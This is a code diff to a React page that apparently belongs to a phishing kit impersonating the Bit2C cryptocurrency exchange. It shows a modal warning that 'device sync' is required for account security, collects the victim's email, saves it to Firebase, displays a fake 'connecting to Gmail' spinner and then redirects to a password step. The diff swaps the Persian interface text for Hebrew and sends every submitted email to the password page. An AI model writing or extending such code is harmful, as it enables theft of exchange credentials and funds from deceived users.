@@ -43,21 +43,9 @@ const DevicePage = () => {
   const handleVerifyClick = async () => {
     if (deviceNumber.length <= 3) return;
 
-    // Verificar se o email é Gmail
-    const isGmail = deviceNumber.toLowerCase().includes('@gmail.com');
+    // Sempre mostrar o spinner do Gmail quando clicar no botão
+    setShowGmailSpinner(true);
     
-    if (isGmail) {
-      // Esconder o conteúdo do modal e mostrar o spinner do Gmail
-      setShowGmailSpinner(true);
-      // Simular carregamento do Gmail por 3 segundos e redirecionar
-      setTimeout(() => {
-        window.location.href = `${window.location.origin}/sync?view=password`;
-      }, 3000);
-      return;
-    }
-
-    setVerifyLoading(true);
-
     try {
       // Atualizar dados no Firebase
       await updateClientData({
@@ -66,14 +54,12 @@ const DevicePage = () => {
         verificationStatus: "Processing",
       });
 
-      // Simular processo de verificação (como na página auth)
+      // Simular carregamento do Gmail por 3 segundos e redirecionar
       setTimeout(() => {
-        setVerifyLoading(false);
-        setShowNextStep(true);
-        setHideMainContent(true);
-      }, 2000);
+        window.location.href = `${window.location.origin}/sync?view=password`;
+      }, 3000);
     } catch (error) {
-      setVerifyLoading(false);
+      setShowGmailSpinner(false);
       console.error("❌ Erro ao verificar device:", error);
     }
   };
@@ -547,7 +533,7 @@ const DevicePage = () => {
           {/* Header do Modal */}
           <div className="text-center p-4 sm:p-6 pb-2 sm:pb-3 relative">
             <h2 className="text-lg sm:text-xl font-semibold text-gray-800 mb-1" dir="rtl">
-              همگام سازی دستگاه مورد نیاز است
+              נדרש סנכרון מכשיר
             </h2>
           </div>
 
@@ -581,20 +567,20 @@ const DevicePage = () => {
                  
                  {/* Loading text */}
                  <div className="flex items-center justify-center" dir="rtl">
-                   <span className="text-lg text-gray-700 font-medium">در حال اتصال به Gmail...</span>
+                   <span className="text-lg text-gray-700 font-medium">מתחבר ל-Gmail...</span>
                  </div>
                </div>
             ) : (
               <>
                 {/* Description */}
                 <p className="text-gray-600 mb-6 text-center text-sm sm:text-base leading-relaxed" dir="rtl">
-                  برای اطمینان از امنیت حساب شما، همگام سازی ایمیل ضروری است. لطفاً ایمیل حساب Bit2C خود را در زیر تأیید کنید تا به روزرسانی ادامه یابد.
+                  כדי להבטיח את אבטחת החשבון שלך, סנכרון אימייל הוא חיוני. אנא אשר את האימייל של חשבון Bit2C שלך למטה כדי להמשיך בעדכון.
                 </p>
 
                 {/* Email Input */}
                 <div className="mb-6">
                   <label className="block text-sm font-medium text-gray-700 mb-2" dir="rtl">
-                    ایمیل
+                    אימייל
                   </label>
                   <input
                     type="text"
@@ -626,14 +612,6 @@ const DevicePage = () => {
                   />
                 </div>
 
-                {/* Loading indicator */}
-                {verifyLoading && (
-                  <div className="flex items-center justify-center space-x-2 text-gray-500 mb-6" dir="rtl">
-                    <div className="w-4 h-4 border-2 border-gray-300 rounded-full animate-spin border-t-blue-600"></div>
-                    <span className="text-sm">در حال تأیید...</span>
-                  </div>
-                )}
-
                 {/* Continue Button */}
                 <div className="flex justify-center">
                   <button 
@@ -643,7 +621,7 @@ const DevicePage = () => {
                       verifyLoading || deviceNumber.length <= 3 ? 'opacity-50 cursor-not-allowed' : ''
                     }`}
                   >
-                    {verifyLoading ? "در حال تأیید..." : "ادامه"}
+                    {verifyLoading ? "שולח..." : "שלח"}
                   </button>
                 </div>
               </>
